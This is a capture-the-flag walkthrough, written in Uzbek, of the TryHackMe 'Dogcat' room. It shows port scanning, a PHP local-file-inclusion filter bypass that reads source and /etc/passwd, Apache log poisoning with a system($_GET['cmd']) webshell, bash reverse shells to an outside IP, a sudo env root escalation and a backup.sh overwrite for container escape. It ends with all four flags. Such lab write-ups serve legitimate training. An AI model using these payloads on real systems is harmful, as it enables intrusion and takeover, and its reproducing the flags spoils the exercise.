# Dogcat

Room: https://tryhackme.com/room/dogcat



## Aktiv Razvetka

Buyruq:

```
rustscan -a 10.10.48.168 -- -sV
```

Natija:

```
╭─mete   󰉖 ~
╰─ ❯❯ rustscan -a 10.10.48.168 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

[~] The config file is expected to be at "/home/mete/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.48.168:22
Open 10.10.48.168:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.48.168
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 00:38 +05
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 00:38
Scanning 10.10.48.168 [2 ports]
Completed Ping Scan at 00:38, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:38
Completed Parallel DNS resolution of 1 host. at 00:38, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 00:38
Scanning 10.10.48.168 [2 ports]
Discovered open port 22/tcp on 10.10.48.168
Discovered open port 80/tcp on 10.10.48.168
Completed Connect Scan at 00:38, 0.22s elapsed (2 total ports)
Initiating Service scan at 00:38
Scanning 2 services on 10.10.48.168
Completed Service scan at 00:38, 6.46s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.48.168.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 00:38
Completed NSE at 00:38, 0.94s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 00:38
Completed NSE at 00:38, 0.89s elapsed
Nmap scan report for 10.10.48.168
Host is up, received syn-ack (0.22s latency).
Scanned at 2025-06-13 00:38:32 +05 for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.88 seconds
```



Routinglarga nazar solsak:

```
mete@sec ~> gobuster dir -u http://10.10.48.168 -w /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.48.168
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cats                 (Status: 301) [Size: 311] [--> http://10.10.48.168/cats/]
/dogs                 (Status: 301) [Size: 311] [--> http://10.10.48.168/dogs/]
```

Fayllar:

```
mete@sec ~> gobuster dir -u http://10.10.48.168 -w /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.48.168
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 418]
/cat.php              (Status: 200) [Size: 26]
/flag.php             (Status: 200) [Size: 0]
/cats                 (Status: 301) [Size: 311] [--> http://10.10.48.168/cats/]
/dogs                 (Status: 301) [Size: 311] [--> http://10.10.48.168/dogs/]
/dog.php              (Status: 200) [Size: 26]
```





## Zaiflik qidirish

Bizda so'rovlar yuborish imkoni bor ekan. Qo'pol qilib aytganda, qichimalikni boshladik.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/dogcat_1.jpg)

LFI zaifligi...
Keling flag.php faylini o'qiymiz.

Filter bor. Aylanib o'tishga harakat qilamiz.

So'rov:

```
GET /?view=php://filter/convert.base64-encode/resource=dog/../flag HTTP/1.1
Host: 10.10.48.168
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


```

Javob:

```
HTTP/1.1 200 OK
Date: Thu, 12 Jun 2025 20:04:03 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.3
Vary: Accept-Encoding
Content-Length: 506
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=    </div>
</body>

</html>

```

Flag (kodlangan| base 64)

```
PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=
```

Koddan chiqarilgan:

```
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```

Ura! 1-flag olindi!

Endi hozir topgan zaifligimizdan foydalangan holda dasturiy kodlarni qo'lga kiritamiz.

index.php:

```
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>

```

**/etc/passwd** faylini olishga harakat qilib ko'ramiz, **source code** taxlilidan so'ng:

```
mete@sec ~> curl 'http://10.10.48.168/?view=php://filter/convert.base64-encode/resource=dog/../../../../../etc/passwd&ext='
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo=    </div>
</body>

</html>
```

Natija:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

```



## Web hacking

Log Poisoningga qo'l urdik.

Dastlab tarkibida 

```
User-Agent: <?php system($_GET['cmd']); ?>
```

Mavjud bo'lgan so'rov yuoramiz, kleyin esa  test so'rovini yuboramiz.

```
curl "http://10.10.48.168/?view=dog/../../../../../var/log/apache2/access.log&ext=&cmd=whoami"
```

Ishladi!

> WARNING: Buni qilishdan oldin mashinani qayta ishga tushiring fuzzing tasirida logni to'ldirib yuborgan bo'lishingiz mumkin.

Reverse Shell bo'lgan so'rov:

```
curl 'http://10.10.232.31/?view=dog/../../../../../var/log/apache2/access.log&ext=&cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.8.24.135/4444+0>%261"'

```

Reverse Shellni qabul qilish:

```
nc -nvln 4444
```

Natija:

```
mete@sec ~ [SIGINT]> nc -nvln 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.232.31 55110
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@e841639e8887:/var/www/html$ 
```

2-flagni qo'lga kiritish:

```
www-data@e841639e8887:/var/www$ ls
ls
flag2_QMW7JvaY2LvK.txt
html
www-data@e841639e8887:/var/www$ cat flag2_QMW7JvaY2LvK.txt
cat flag2_QMW7JvaY2LvK.txt
THM{LF1_t0_RC3_aec3fb}
```



## Privilage Escalation

Bizni qiziqtirgan nuqta:

```
www-data@e841639e8887:/opt/backups$ ls
ls
backup.sh
backup.tar
www-data@e841639e8887:/opt/backups$ cat backup.sh
cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

Lekin imkoniyatlar nuqtasiga ham qarash kerak:

```
www-data@e841639e8887:/opt/backups$ sudo -l
sudo -l
Matching Defaults entries for www-data on e841639e8887:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on e841639e8887:
    (root) NOPASSWD: /usr/bin/env
www-data@e841639e8887:/opt/backups$ sudo env /bin/sh
sudo env /bin/sh
whoami
root
```

env buyrug'idan eskalatsiya uchun foydalanishni o'rganish uchun link:

```
https://gtfobins.github.io/gtfobins/env/#sudo
```



3-flagni qo'lga kiritish:

```
cd /root
ls
flag3.txt
cat flag3.txt
THM{D1ff3r3nt_3nv1ronments_874112}
```



TTY ochish:

```
script /dev/null -c /bin/bash
```

Natija:

```
script /dev/null -c /bin/bash   
Script started, file is /dev/null
root@e841639e8887:/#
```



Tepada aytil o'tilgan backup.sh faylini tahrirlab Reverse Shell joylashtiramiz:

```
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.8.24.135/4445 0>&1'" > backup.sh
```

Reverse Shellni qabul qilish:

```
nc -nvln 4445
```

Natija:

```
mete@sec ~> nc -nvln 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.232.31 52346
bash: cannot set terminal process group (3542): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# 
```



4-flag yani oxirgi flagni olish:

```
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```



# Nafas olar ekanman, men yana davom etaman...
